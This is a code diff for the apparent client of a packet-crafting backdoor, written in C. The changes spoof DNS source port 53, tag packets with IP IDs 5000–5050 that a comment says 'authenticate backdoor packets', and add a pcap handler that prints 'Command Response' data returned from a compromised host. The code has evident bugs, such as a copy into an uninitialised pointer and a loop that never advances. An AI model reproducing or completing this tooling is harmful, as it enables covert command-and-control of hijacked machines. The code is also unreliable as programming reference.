@@ -5,9 +5,12 @@
 #include "client.h"
 #include "util.h"
 
+int end;
+
 int main (int argc, char* argv[]) {
 
 	int srcip, destip;
+	int end = 0;
 
 	// convert source ip to binary
 	srcip = host_convert(argv[1]);
@@ -116,7 +119,7 @@ void packet_new(client *c, char *msg, char* protocol) {
 		packets_udp.ip.tos = 0;
 		packets_udp.ip.tot_len = 0;
 		packets_udp.ip.id = 0;
-		packets_udp.ip.frag_off = 0;
+		packets_udp.ip.frag_off = htons(0x4000);
 		packets_udp.ip.ttl = 64;
 
 		packets_udp.ip.protocol = IPPROTO_UDP;
@@ -159,8 +162,10 @@ void packet_new(client *c, char *msg, char* protocol) {
 		packets_udp.ip.saddr = c->source_host;
 		packets_udp.ip.daddr = c->dest_host;
 
-		packets_udp.udp.source = 0;
-		packets_udp.udp.dest = 0;
+		packets_udp.udp.source = 53;
+		packets_udp.udp.dest = 5050;
+		//c->source_port = 53;
+		c->dest_port = 53;
 		packets_udp.udp.len = 0;
 		packets_udp.udp.check = 0;
 
@@ -179,6 +184,7 @@ void packet_new(client *c, char *msg, char* protocol) {
 		packets_tcp.tcp.seq = 1 + (int) (10000.0 * rand() / (RAND_MAX + 1.0));
 
 
+		// generate random id between 5000 and 5050 used to authenticate backdoor packets
 		randomID = randomRange(5000, 5050);
 		packets_tcp.ip.id = htons(randomID);
 
@@ -196,13 +202,16 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 		//packets_udp.udp.seq = 1 + (int) (10000.0 * rand() / (RAND_MAX + 1.0));
 
-
+		// generate random id between 5000 and 5050 used to authenticate backdoor packets
 		randomID = randomRange(5000, 5050);
 		packets_udp.ip.id = htons(randomID);
 
-		packets_udp.ip.tot_len = ((4 * packets_udp.ip.ihl) + strlen(packets_udp.data));
+		packets_udp.ip.tot_len = ((4 * packets_udp.ip.ihl) + sizeof(packets_udp.udp)+ strlen(packets_udp.data));
 
 		packets_udp.ip.check = in_cksum((unsigned short *) &packets_udp.ip, 20);
+
+		packets_udp.udp.len = ((4 * packets_udp.ip.ihl) + sizeof(packets_udp.udp) - strlen(packets_udp.data));
+
 	}
 
 
@@ -224,7 +233,8 @@ void packet_new(client *c, char *msg, char* protocol) {
 		pseudo_header_udp.placeholder = 0;
 		pseudo_header_udp.protocol = IPPROTO_UDP;
 
-		pseudo_header_udp.udp_length = htons(UDP_HDR_SIZ);
+		// or size of UDP_HDR_SZ
+		pseudo_header_udp.udp_length = htons(packets_udp.udp.len);
 
 		bcopy((char *) &packets_udp.udp, (char *) &pseudo_header_udp.udp, 20);
 		/* Final checksum on the entire package */
@@ -387,6 +397,64 @@ void parse_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *packet) {
 		fprintf(file,"==================================================================\n\n");
 
 		fclose(file);
+		//running = false;
+	}
+}
+
+void parse_response_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *packet) {
+	struct iphdr* iphdr;
+	struct tcphdr* tcphdr;
+	char *tcp_payload;
+	int size_ip, size_tcp;
+
+
+	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
+	tcphdr = (struct tcphdr*) (packet + sizeof(struct ether_header)
+			+ sizeof(struct iphdr));
+
+	size_ip = iphdr->ihl * 4;
+	size_tcp = tcphdr->doff * 4;
+
+	if (size_tcp < 20) {
+		printf("INVALID TCP HEADER SIZE\n");
+		return;
+	}
+
+	if ((ntohs(iphdr->id) >= 5000) && (ntohs(iphdr->id) <= 5050)) {
+
+		while(!end) {
+
+			char *ptr = 0;
+			char *data;
+			int buf_len = 0;
+
+			ptr += 4;
+
+			tcp_payload = (char *) (packet + sizeof(struct ether_header) + size_ip
+					+ size_tcp);
+
+			tcp_payload += 4;
+
+			memcpy(data, tcp_payload, 1);
+			buf_len += 1;
+
+			if (buf_len % FRAM_SZ != 0) {
+				continue;
+			}
+
+			tcp_payload -= FRAM_SZ - 1;
+
+			// decrypt payload
+			//decrypt(SEKRET, data, FRAM_SZ);
+
+
+			// decrypt payload
+			//tcp_payload = decrypt();
+			printf("Command Response: \n\n%s\n", tcp_payload);
+			printf("==================================================================\n\n");
+		}
+
+		//fclose(file);
 		//running = false;
 	}
 }
